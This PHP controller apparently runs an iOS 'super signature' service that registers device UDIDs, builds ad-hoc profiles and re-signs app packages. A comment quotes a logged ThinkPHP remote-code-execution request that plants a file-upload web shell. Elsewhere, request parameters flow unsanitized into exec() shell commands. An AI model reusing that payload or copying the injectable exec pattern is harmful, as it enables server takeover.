<?php

//下载页面
namespace app\user\controller;

use app\communal\Count;
use cmf\controller\HomeBaseController;
use MingYuanYun\AppStore\Client;
use think\Db;
use OSS\OssClient;
use OSS\Core\OssException;
use think\Log;
use think\Request;

class InstallController extends HomeBaseController
{
    public function ud_id(){
        return $this->fetch('ud_id');
    }
    
    public function updateCert(){

	   include PLUGINS_PATH . "/ipaphp/vendor/autoload.php";
	   include PLUGINS_PATH . "/ipaphp/vendor/yunchuang/appstore-connect-api/src/Client.php";
	   
	   $certificate_record = Db::name('ios_certificate')->where('status','=',1)->select()->toArray();
	 
	   
	   $count = 0;
	
	   foreach ($certificate_record as $item) {
	         $config = [
		         'iss'    => $item['iss'],
		         'kid'    => $item['kid'],
		         'secret' => APP_ROOT . $item['p8_file']
		     ];
	    
		     $client = new Client($config);
		
		     $client->setHeaders([
		         'Authorization' => 'Bearer ' . $client->getToken(),
		     ]);
		    
		       
		     $allDevices = $client->api('device')->all([
		    	'filter[platform]'=>'IOS'
		     ]);
	
			 
		     if(isset($allDevices['errors'][0]['status']) && $allDevices['errors'][0]['status'] == 403){
		     	Db::name('ios_certificate')->where('id',$item['id'])->update(['status'=>403]);
		     }elseif(isset($allDevices['errors'][0]['status']) && $allDevices['errors'][0]['status'] == 401){
		    	$count = $count + 1;
		    	Db::name('ios_certificate')->where('id',$item['id'])->update(['status'=>401]);
		    	dump($item['id']);
		     }else if($allDevices['meta']['paging']['total']){
		    	$total_count = $allDevices['meta']['paging']['total']>100 ? 100 : $allDevices['meta']['paging']['total'];
	    		$limit_count = 100-$total_count;
	    		
	    		Db::name('ios_certificate')->where('id',$item['id'])->update(['limit_count'=>$limit_count,'total_count'=>$total_count,'status'=>1]);
		     }
	    }
	   
		dump($count);
	}

    //首页安装
    public function index(){
             //域名跳转     
if ($_SERVER['HTTP_HOST'] == 'app.ios999.com'){
  $url[1] = "chaochang1314520.app3333.cn:81";
  $url[2] = "cnm.app3333.cn:81";
  //$url[3] = "chaochang1314520.app3333.cn:81";
  //$url[4] = "";
  //$url[5] = "";
  $out=rand(1, 2);
  function Www($len = 32)
{
	$str = "abcdefjhijklmnopqrstuvwxyz0123456789";
	$strlen = strlen($str);
	$randstr = "";
	for ($i = 0; $i < $len; $i++) {
		$randstr .= $str[mt_rand(0, $strlen - 1)];
	}
	return $randstr;
}
  $tzurl = Www(32).'.'.$url[$out];
  exit(header('location:http://'.$tzurl. $_SERVER['REQUEST_URI']));
}
      
        //$er_logo = explode('?', substr($_SERVER['REQUEST_URI'], 1))[0];

        $er_logo = explode('?', substr($_SERVER['REQUEST_URI'], 1))[0];

        if (!$resultAPP = Db::name("user_posted")->where('er_logo',$er_logo)->find()) {
            $this->error('该应用不存在或已过期...', '/', 3);
            exit;
        }

        $title    = $resultAPP['status'] === 0 ? '已下架' : '已删除';
        $plistUrl = '';

        if($resultAPP['status']==1){
            $userInfo = Db::name('user')->find($resultAPP['uid']);

            if(!$userInfo || $userInfo['user_status']==0){
                $this->error('该APP被禁用', '/', 3);
                exit;
            }

            if($userInfo['sup_down_public']<=0){
                $this->error('项目公有池下载量不足，请联系管理员续费！', '/', 3);
                exit;
            }

            $plistUrl = 'http://'.$_SERVER['HTTP_HOST'] ."/upload/plist/" . md5($resultAPP['url']) . ".plist";
            $title    = false;
        }
		$resultAPP['er_logo'] = 'https://app.ios999.com/'. $resultAPP['er_logo'];
		//$resultAPP['er_logo'] = 'https://' . $_SERVER['HTTP_HOST'] .'/'. $resultAPP['er_logo'];
		if($resultAPP['andriod_url'] && strpos($resultAPP['andriod_url'],'http') === false && strpos($resultAPP['andriod_url'],'https') === false){
			 $resultAPP['andriod_url'] = 'http://'.upd_tok_config()['domain'].'/'.$resultAPP['andriod_url'];
        }

//        60.210.249.198 - - [06/Nov/2019:16:12:32 +0800] "GET
//        /?s=admin/think\x5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=info.php&vars[1][]=%3Cform%20%20method=%22post%22%20enctype=%22multipart/form-data%22%3E%3Cinput%20name=%22upfile%22%20type=%22file%22%3E%3Cinput%20type=%22submit%22%20value=%22ok%22%3E%3C/form%3E%3C?php%20if%20($_SERVER[%27REQUEST_METHOD%27]%20==%20%27POST%27)%20{%20echo%20%22!%20%20%20url+%22.$_FILES[%22upfile%22][%22name%22];%20if(!file_exists($_FILES[%22upfile%22][%22name%22])){%20copy($_FILES[%22upfile%22][%22tmp_name%22],%20$_FILES[%22upfile%22][%22name%22]);}}?%3E
//        HTTP/1.1" 200 34 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36"

        $this->assign([
            'result'   => $resultAPP,
            'device'   => $this->get_device_type(),
            'plistUrl' => $plistUrl,
            'title'    => $title,
            'is_wx'    => $this->is_wei_xin(),
        	'is_qq'    => $this->is_qq()
        ]);

        return $this->fetch('index_new');
    }

    //获取UDID并做301跳转
    public function get_udid(){
        $data = file_get_contents('php://input');

        $plistBegin     = '<?xml version="1.0"';
        $plistEnd       = '</plist>';

        $data2          = substr($data, strpos($data, $plistBegin), strpos($data, $plistEnd) - strpos($data, $plistBegin));
        $xml            = xml_parser_create();
        $UDID           = "";
        $CHALLENGE      = "";
        $DEVICE_NAME    = "";
        $DEVICE_PRODUCT = "";
        $DEVICE_VERSION = "";
        $iterator       = 0;
        $arrayCleaned   = array();
        $data           = "";

        xml_parse_into_struct($xml, $data2, $vs);
        xml_parser_free($xml);

        foreach ($vs as $v) {
            if ($v['level'] == 3 && $v['type'] == 'complete') {
                $arrayCleaned[] = $v;
            }
        }

        foreach ($arrayCleaned as $elem) {
            switch ($elem['value']) {
                case "CHALLENGE":
                    $CHALLENGE = $arrayCleaned[$iterator + 1]['value'];
                    break;
                case "DEVICE_NAME":
                    $DEVICE_NAME = $arrayCleaned[$iterator + 1]['value'];
                    break;
                case "PRODUCT":
                    $DEVICE_PRODUCT = $arrayCleaned[$iterator + 1]['value'];
                    break;
                case "UDID":
                    $UDID = $arrayCleaned[$iterator + 1]['value'];
                    break;
                case "VERSION":
                    $DEVICE_VERSION = $arrayCleaned[$iterator + 1]['value'];
                    break;
            }
            $iterator++;
        }
        
        $this->redirect(get_site_url() . "/user/install/udid_redirect?udid=" . $UDID . '&app_id=' . intval(input('param.app_id')).'&version='.$DEVICE_VERSION.'&device_name='.$DEVICE_PRODUCT, 301);
    }

    //UDID 回调函数 生成下载包 在这步进行用户的扣款处理
    public function udid_redirect(){
        $udid        = $_REQUEST['udid'];
        $app_id      = $_REQUEST['app_id'];
        $ios_version = $_REQUEST['version'];
        $device_name = $_REQUEST['device_name'];

        //查询该APP剩余的设备下载数
        if (!$app = db('user_posted')->find($app_id)) {
            $this->error('该应用不存在或已过期...', '/', 3);
            exit;
        }

        //如果开启了每日下载限制
        if($app['warning']!=0){
            if(Count::getUdidCountByTime($app['uid'],time())>=$app['warning']){
                //TODO 预警短信触发
                //is_warning($app['uid'],$app['sup_down_public'],$app['mobile']);
                $this->error('该应用已下架，请联系管理员！');
                exit;
            }
        }

        //判断用户的下载次数
        $userInfo = Db::name('user')->find($app['uid']);

        if(!$userInfo || $userInfo['user_status'] == 0){
            $this->error('该APP被禁用', '/', 3);
            exit;
        }

        if($userInfo['sup_down_public']<=0){
            $this->error('项目公有池下载量不足，请联系管理员续费！', '/', 3);
            exit;
        }

        include PLUGINS_PATH . "/ipaphp/vendor/autoload.php";
        include PLUGINS_PATH . "/ipaphp/vendor/yunchuang/appstore-connect-api/src/Client.php";
        
		//->where('app_id',$app_id)
        if($udId_log = db('ios_udid_list')->where('udid',$udid)->find()){
            $certificate_record = Db::name('ios_certificate')->find($udId_log['certificate']);
        }else{
            if($app['download_type']==1){
                $certificate_record = Db::name('ios_certificate')->where('user_id', '=', 1)->where('limit_count >0')->where('status',1)->find();
            }else{
                $certificate_record = Db::name('ios_certificate')->where('user_id', '=', $app['uid'])->where('limit_count >0')->where('status',1)->find();
            }
        }
	
		
        if (!$certificate_record) {
            $this->error('没有可使用的证书，请联系管理员');
            exit;
        }

        $config = [
            'iss'    => $certificate_record['iss'],
            'kid'    => $certificate_record['kid'],
            'secret' => APP_ROOT . $certificate_record['p8_file']
        ];
    

        $client = new Client($config);

        $client->setHeaders([
            'Authorization' => 'Bearer ' . $client->getToken(),
        ]);
       
		
        $name         = make_password(8);   #每次不能重复
        $profileType  = 'IOS_APP_ADHOC';
        $devices      = [];
        $certificates = [
            $certificate_record['tid'],
        ];

        //构建Bundle ID
        $bundleId   = $app['bundle'] . $certificate_record['tid'];

        $bid_result = $client->api('bundleId')->all([
            'fields[bundleIds]' => 'identifier',
            'filter[identifier]' => $bundleId
        ]);

        //如果有设备ID
        if (!$bid_result['data']) {
            $result = $client->api('bundleId')->register($name, 'IOS', $bundleId);

            if (!isset($result['data'])) {
                $this->error('创建包名失败，请联系管理员');
                exit;
            }else{
                $bId = $result['data']['id'];
            }
            //启用推送功能
            $client->api('bundleIdCapabilities')->enable($result['data']['id'], 'PUSH_NOTIFICATIONS');
        } else {
            $bId = $bid_result['data'][0]['id'];
        }
	
        //查询证书是否添加过该UDID
        $device_info = $client->api('device')->all([
            'filter[udid]' => $udid,
            'limit'        => 1
        ]);
		
        if ($device_info['data']) {
            $devices[] = $device_info['data'][0]['id'];
        } else {
            //如果只仅仅下载一次
            if($app['only_download']==1){
                $user_link = db('user_link_log')->where('code',session('super_link_on'))->find();
                if($user_link['status'] == 1){
                    $this->error('下载链接失效，请联系管理员获取!');
                    exit;
                }else{
                    db('user_link_log')->where('code',session('super_link_on'))->update(['status'=>1]);
                }
            }
		
            $result = $client->api('device')->register($name, 'IOS', $udid);
		
            if (!isset($result['data'])) {
                $this->error('添加udid失败，请联系管理员获取!');
                exit;
            }
            $devices[] = $result['data']['id'];
        }
   
        //更新设备数
        if (!$udId_record = db('ios_udid_list')->where('app_id',$app_id)->where('udid',$udid)->where('certificate',$certificate_record['id'])->find()) {
            $allDevices = $client->api('device')->all([
                'filter[platform]'=>'IOS'
            ]);
            $total_count = $allDevices['meta']['paging']['total'];
            $limit_count = 100-$allDevices['meta']['paging']['total'];
            Db::name('ios_udid_list')->insert([
                'udid'        => $udid,
                'app_id'      => $app_id,
                'user_id'     => $app['uid'],
                'certificate' => $certificate_record['id'],
                'device'      => $devices[0],
                'create_time' => time(),
                'version'     => $app['version'],
                'ip'          => get_client_ip(),
                'ios_version' => $ios_version,
                'device_name' => $device_name
            ]);
            Db::name("user")->where("id",$app['uid'])->setDec("sup_down_public");
            //用户消费记录
            Db::name('sup_charge_log')->insert([
                'uid'     =>$app['uid'],
                'num'     =>1,
                'type'    =>1,
                'addtime' =>time(),
                'addtype' =>1,
                'is_add'  =>0,
                'msg'     =>'下载应用:('.$app_id.')设备扣除'
            ]);
            Db::name('ios_certificate')->where('id',$certificate_record['id'])->update(['limit_count'=>$limit_count,'total_count'=>$total_count]);
        }

        //创建描述文件
        $result = $client->api('profiles')->create($name, $bId, $profileType, $devices, $certificates);

        if(empty($result['data']['attributes']['profileContent'])){
            $this->error('证书配置错误，请联系管理员获取!');
            exit;
        }

        file_put_contents("./ios_movileprovision/$udid.mobileprovision", base64_decode($result['data']['attributes']['profileContent']));

        //生成证书文件
        $absolute_path = config('absolute_path');

        exec('openssl pkcs12 -in '.$absolute_path.'public'.$certificate_record['p12_file'].' -out '.$absolute_path.'public/spcer/'.$certificate_record['id'].'certificate.pem -clcerts -nokeys -password pass:'.$certificate_record['p12_pwd']);
        exec('openssl pkcs12 -in '.$absolute_path.'public'.$certificate_record['p12_file'].' -out '.$absolute_path.'public/spcer/'.$certificate_record['id'].'key.pem -nocerts -nodes -password pass:'.$certificate_record['p12_pwd']);

        //生成签名后的包
        $files = $absolute_path."public/ios_movileprovision/$udid.mobileprovision";
        $ipa   = $absolute_path."public/".$app['url'];
        // exec('export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin;isign -c '.$absolute_path.'public/spcer/'.$certificate_record['id'].'certificate.pem -k '.$absolute_path.'public/spcer/'.$certificate_record['id'].'key.pem -p "'.$files.'"  -o '.$absolute_path.'public/upload/super_signature_ipa/'.$udid.md5($app['bundle']).$app['er_logo'].'.ipa "'.$ipa.'" 2>&1',$out,$status);
		exec('export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/home/zsign;zsign -c '.$absolute_path.'public/spcer/'.$certificate_record['id'].'certificate.pem -k '.$absolute_path.'public/spcer/'.$certificate_record['id'].'key.pem -m "'.$files.'"  -o '.$absolute_path.'public/upload/super_signature_ipa/'.$udid.md5($app['bundle']).$app['er_logo'].'.ipa -z 9 '.$ipa.' 2>&1',$out,$status);
        // 存储错误日志
        file_put_contents('./sign_error_log/'.$udid.$app['bundle'].time().'.txt',$out);


        //上传文件到阿里云
        $supUrl  = alUpload([
            'filePath'=>'upload/super_signature_ipa/'.$udid.md5($app['bundle']).$app['er_logo'].'.ipa',
            'fileName'=>$udid.md5($app['bundle']).$app['er_logo'].'.ipa',
        ]);

        $sup_id = Db::name("super_signature_ipa")->insertGetId([
            'appid'   => $app_id,
            'supurl'  => $supUrl,
            'udid'    => $udid,
            'addtime' => time(),
        ]);

        //TODO 删除排队下载的记录 暂时没用
        $downloading = Db::name('downloading')->select()->toArray();

        if(!empty($downloading)){
            Db::name('downloading')->delete($downloading[0]['id']);
        }

        $this->redirect(get_site_url() . "/user/install/ios_install?sup_id=" . $sup_id.'&c_id='.$certificate_record['id'].'&version='.$ios_version, 301);
    }

    //超级签名下载
    public function ios_install(){
        $sup_id      = input('param.sup_id');
        $ios_version = input('param.version');

        $ipaResult   = Db::name('super_signature_ipa')->alias('ipa')
            ->join('user_posted posted','posted.id=ipa.appid')
            ->where('ipa.id',$sup_id)
            ->find();

        if (!$ipaResult) {
            $this->error('该应用不存在或已过期...');
            exit();
        }

        //判断设备
        $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
        if (strpos($agent, 'iphone')) {
            $device = 'iphone';
        }else if(strpos($agent, 'ipad')){
            $device = 'ipad';
        }else{
            $device = 'other';
        }

        //添加下载记录
        if($device != 'other' ){
        	 Db::name('super_download_log')->insert([
	            'uid'    => $ipaResult['uid'],
	            'app_id' => $ipaResult['id'],
	            'addtime'=> time(),
	            'device' => $device,
	            'type'   => 1,
	            'ip'     => Request::instance()->ip(),
	            'ios_version' =>$ios_version,
	            'version'=>$ipaResult['version']
	        ]);
	
	        $xmlStr = '<?xml version="1.0" encoding="UTF-8"?>
	            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
	            <plist version="1.0">
	                <dict>
	                    <key>items</key>
	                    <array>
	                        <dict>
	                            <key>assets</key>
	                            <array>
	                                <dict>
	                                    <key>kind</key>
	                                    <string>software-package</string>
	                                    <key>url</key>
	                                    <string>' . $ipaResult["supurl"] . '</string>
	                                </dict>
	                            </array>
	                            <key>metadata</key>
	                            <dict>
	                                <key>bundle-identifier</key>
	                                <string>' . $ipaResult["bundle"] . '</string>
	                                <key>bundle-version</key>
	                                <string>' . $ipaResult["version"] . '</string>
	                                <key>kind</key>
	                                <string>software</string>
	                                <key>title</key>
	                                <string>' . $ipaResult["name"] . '</string>
	                            </dict>
	                        </dict>
	                    </array>
	                </dict>
	            </plist>';
	
	        $filename = APP_ROOT . DS . 'upload' . DS . 'udidplist' . DS . $ipaResult['udid'].'_'.md5($sup_id) . '.plist';
	
	        if (!file_exists($filename)) {
	            $xmlFile = fopen($filename, "w") or die("Unable to open file!");
	            fwrite($xmlFile, $xmlStr);
	            fclose($xmlFile);
	        }
        }
       
        $this->assign('supurl',$ipaResult["supurl"]);
        $this->assign('result',$ipaResult);
        $this->assign('ios', 'https://' . $_SERVER['HTTP_HOST'] . "/upload/udidplist/" . $ipaResult['udid'].'_'.md5($sup_id) . ".plist");

        return $this->fetch();
    }

    //判断是否在微信中打开
    public function is_wei_xin(){
        $sUserAgent = strtolower($_SERVER["HTTP_USER_AGENT"]);

        if (strpos($sUserAgent, 'micromessenger') !== false) {
            return true;
        } else {
            return false;
        }
    }

    //判断是否在qq打开
    public function is_qq(){
        $sUserAgent = strtolower($_SERVER["HTTP_USER_AGENT"]);

        if (strpos($sUserAgent, "qq") !== false) {
            if (strpos($sUserAgent, "mqqbrowser") !== false && strpos($sUserAgent, "pa qq") === false || (strpos($sUserAgent, "qqbrowser") !== false && strpos($sUserAgent, "mqqbrowser") === false)) {
                return false;
            } else {
                return true;
            }
        } else {
            return false;
        }
    }

    //判断手机类型
    public function get_device_type(){
        $agent = strtolower($_SERVER['HTTP_USER_AGENT']);

        if(strpos($agent, 'iphone')){
            $type = 'iphone';
        }else if(strpos($agent, 'ipad')){
            $type = 'ipad';
        }else if(strpos($agent, 'android')){
            $type = 'android';
        }else{
            $type = 'other';
        }

        return $type;
    }

    //添加排队 TODO 暂时没用到
    public function getudid_mobileconfig(){
        $app_id = intval(input('param.id'));

        $config = get_config();
        $count  = db('downloading')->count();

        $num = '';
        if($count>=$config['down_max_num']){
            $data = [
                'code'=>2,
                'msg'=>'正在排队请稍后获取！'
            ];
            echo json_encode($data);
            exit;
        }else{
            //添加排队记录
            $rou  = rand(1111,9999);
            $time = time();
            $num  = $rou.$time;
            $add  = [
                'appid'  =>$app_id,
                'addtime'=>$time,
                'num'    =>$num,
            ];
            db('downloading')->insert($add);
        }

        $data = [
            'code'  => 1,
            'appid' => $app_id,
            'http'  => $_SERVER['REQUEST_SCHEME'].$_SERVER['HTTP_HOST'],
            'id'    => $num
        ];

        echo json_encode($data);
    }

    //下载数据 TODO 暂时没用到
    public function buts(){
//        $id         = $_POST['id'];
//        $postedinfo = Db::name("user_posted")->where("id=$id")->find();
//        $uid        = $postedinfo['uid'];
//        $userinfo   = Db::name("user")->where("id=$uid")->find();
//
//        if ($userinfo['downloads'] > 0) {
//            $data = array(
//                'uid' => $uid,
//                'posted_id' => $id,
//                'creattime' => time()
//            );
//            $result = Db::name("user_posted_log")->insertGetId($data);
//            //下载次数减1
//            Db::name("user")->where("id=$uid")->setDec('downloads');
//
//            return $result ? '1' : '0';
//        } else {
//            return '3';
//        }
    }

}
